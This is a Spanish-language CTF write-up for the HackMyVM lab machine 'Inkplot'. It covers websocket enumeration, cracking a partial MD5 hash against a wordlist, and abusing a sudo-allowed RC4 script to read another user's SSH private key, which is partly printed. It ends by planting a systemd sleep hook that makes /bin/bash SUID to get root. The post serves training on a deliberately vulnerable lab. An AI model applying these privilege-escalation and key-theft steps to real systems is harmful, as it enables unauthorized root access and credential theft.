---
layout: post
title: Inkplot - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/inkplot/inkplot.png#center)

## Reconocimiento

Realizo una enumeración de puertos básica usando **nmap**.

```
$ sudo nmap -p- 192.168.1.28       
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-18 10:06 EDT
Nmap scan report for 192.168.1.28
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:DF:ED:D3 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds
```

### Websocket (3000)

Al navegar al puerto 3000 me encuentro el text "Upgrade required" y el error 426. Aquí se puede leer más información -> [Websocket](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/426).

```
$ curl 192.168.1.28:3000
Upgrade Required 
```

Leyendo acerca de esto en **[HackTricks](https://book.hacktricks.xyz/pentesting-web/cross-site-websocket-hijacking-cswsh#linux-console)** descubro que puedo utilizar **[websocat](https://github.com/vi/websocat)** para conectarme al puerto.

```
$ websocat ws://192.168.1.28:3000/
Welcome to our InkPlot secret IRC server
Bob: Alice, ready to knock our naive Leila off her digital pedestal?
Alice: Bob, I've been dreaming about this for weeks. Leila has no idea what's about to hit her.
Bob: Exactly. We're gonna tear her defense system apart. She won't see it coming.
Alice: Poor Leila, always so confident. Let's do this.
Bob: Alice, I'll need that MD5 hash to finish the job. Got it?
Alice: Yeah, I've got it. Time to shake Leila's world.
Bob: Perfect. Release it.
Alice: Here it goes: d51540...
*Alice has disconnected*
Bob: What?! Damn it, Alice?! Not now!
Leila: clear
```

Obtengo un texto en el que se puede leer el inicio del hash de la contraseña de Leila.

## Explotación

Para obtener la constraseña hago un script en bash que lea línea por línea un fichero con contraseñas y calcule el hash MD5.

```sh
#!/bin/bash

archivo="$1"

#Comprobar que el archivo existe
if [ ! -f "$archivo" ]; then
        echo "El archivo \"$archivo\" no existe."
        exit 1
fi

# Leer línea por línea y calcular el hash MD5
while IFS= read -r linea; do
        hash=$(echo "$linea" | md5sum | awk '{print $1}')
        echo "Línea: $linea | Hash MD5: $hash"
done <"$archivo"
```

```
$ ./script.sh /usr/share/wordlists/rockyou.txt | grep -E "d51540" 
Línea: pa***** | Hash MD5: d515407c6ec25b2a61656a234ddf22bd
Línea: int******** | Hash MD5: d51540c4ecaa62b0509f453fee4cd66b
```

Obtengo un par de resultados, así que ahora toca probar.

```
$ ssh leila@192.168.1.28
╭─leila@inkplot ~ 
╰─$ :)
```

Shell!!

## Escalado de privilegios

### Leila

Compruebo permisos de **sudo**.

```
╭─leila@inkplot ~ 
╰─$ sudo -l
sudo: unable to resolve host inkplot: Name or service not known
Matching Defaults entries for leila on inkplot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User leila may run the following commands on inkplot:
    (pauline : pauline) NOPASSWD: /usr/bin/python3 /home/pauline/cipher.py*
```

Puedo ejecutar el script "/home/pauline/cipher.py" como el usuario Pauline.

cipher.py
```py
import os
import json
import argparse
from Crypto.Cipher import ARC4
import base64

with open('/home/pauline/keys.json', 'r') as f:
    keys = json.load(f)

crypt_key = keys['crypt_key'].encode()

def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        file_content = f.read()

    cipher = ARC4.new(key)
    encrypted_content = cipher.encrypt(file_content)

    encoded_content = base64.b64encode(encrypted_content)

    base_filename = os.path.basename(filepath)

    with open(base_filename + '.enc', 'wb') as f:
        f.write(encoded_content)

    return base_filename + '.enc'

def decrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        encrypted_content = f.read()

    decoded_content = base64.b64decode(encrypted_content)

    cipher = ARC4.new(key)
    decrypted_content = cipher.decrypt(decoded_content)

    return decrypted_content

parser = argparse.ArgumentParser(description='Encrypt or decrypt a file.')
parser.add_argument('filepath', help='The path to the file to encrypt or decrypt.')
parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt the file.')
parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt the file.')

args = parser.parse_args()

if args.encrypt:
    encrypted_filepath = encrypt_file(args.filepath, crypt_key)
    print("The encrypted and encoded content has been written to: ")
    print(encrypted_filepath)
elif args.decrypt:
    decrypt_key = input("Please enter the decryption key: ").encode()
    decrypted_content = decrypt_file(args.filepath, decrypt_key)
    print("The decrypted content is: ")
    print(decrypted_content)
else:
    print("Please provide an operation type. Use -e to encrypt or -d to decrypt.")
```

Los puntos interesantes de este escript es que utiliza el algoritmo RC4 para encriptar y una vez encriptado el contenido lo codifica en base64 para posteriormente guardarlo en un archivo nuevo terminado en ".enc".

En este caso, el fallo se encuentra en utilizar el algoritmo RC4 ya que como se puede ver en la siguiente imágen, al encriptar dos veces un texto con la misma clave, se vuelve al texto original (2 encriptaciones se anulan).

![img](/imgs/write-ups/hackmyvm/inkplot/inkplot_1.png#center)

Conociendo esto, puedo utilizarlo para poder leer el archivo "id_rsa" de pauline.

```
╭─leila@inkplot ~ 
╰─$ cd /home/pauline 
╭─leila@inkplot /home/pauline 
╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e .ssh/id_rsa
sudo: unable to resolve host inkplot: Name or service not known
The encrypted and encoded content has been written to: 
id_rsa.enc
╭─leila@inkplot /home/pauline 
╰─$ cat id_rsa.enc | base64 -d > /tmp/id_rsa_not64.enc
╭─leila@inkplot /home/pauline 
╰─$ sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e /tmp/id_rsa_not64.enc 
sudo: unable to resolve host inkplot: Name or service not known
The encrypted and encoded content has been written to: 
id_rsa_not64.enc.enc
╭─leila@inkplot /home/pauline 
╰─$ cat id_rsa_not64.enc.enc | base64 -d                             
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEArstJauKY8iDoZ1szhWBOMOcer1ns14OgabV4yGuWbLSXj/kzjCRE
UcMu61sUYLd3NFK4JAdScTsZFaVb2ll7grwrSWXEVQL3t4K6TnZzJs6b7bkMpJ2DjPvAa7
KimRoRg02maHKPMZCkxE0cE6OoldmhnQYr1Ou22MzEBTzpjamwcPb+wwgLPFvmDxwx6zUt
JqlBAowHuk+nsHwCVuwy4ucUHvxwsQy6D+n5hBW6gSSEpNUakxrte24kDY7c5NTkcsFjGG
[...]
```

Ahora ya puedo conectarme mediante ssh como Pauline.

```
$ nvim pauline_rsa
$ chmod 600 pauline_rsa 
$ ssh pauline@192.168.1.28 -i pauline_rsa
╭─pauline@inkplot ~ 
╰─$  :)
```

### Pauline

Pauline pertenece al grupo "admin", por lo que busco carpetas y ficheros que pertenezcan a este grupo.

```
╭─pauline@inkplot ~ 
╰─$ find / -group admin 2>/dev/null
/usr/lib/systemd/system-sleep
```

"/usr/lib/systemd/" es una ubicación importante en sistemas que utilizan el sistema de inicio y gestión de servicios **systemd**. Por lo que todo apunta a que en este directorio se ejecutará un script.

```
╭─pauline@inkplot ~ 
╰─$ cd /usr/lib/systemd/system-sleep                                                                            1 ↵
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ nano custom_script
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ chmod +x custom_script
```

custom_script
```sh
#!/bin/bash

case $1 in
    pre)
        chmod +s /bin/bash
        ;;
    post)
        chmod +s /bin/bash
        ;;
esac
```

Tras un tiempo de inactividad el sistema se apaga.

```
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 23 23:23 /bin/bash
╭─pauline@inkplot /usr/lib/systemd/system-sleep 
╰─$ 
Broadcast message from root@inkplot (Fri 2023-08-18 16:33:36 CEST):

The system will suspend now!
```
(Es posible que necesites reiniciar la máquina en virtualbox para que ssh funcione de nuevo)

Al volver a conectarme, compruebo que se ha ejecutado el script y ahora "bash" tiene permiso SUID.

```
$ ssh pauline@192.168.1.28 -i pauline_rsa
╭─pauline@inkplot ~ 
╰─$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23 23:23 /bin/bash
╭─pauline@inkplot ~ 
╰─$ bash -p
bash-5.2# whoami
root
bash-5.2# :)
```

Muchas gracias a **Cromiphi** por esta máquina.
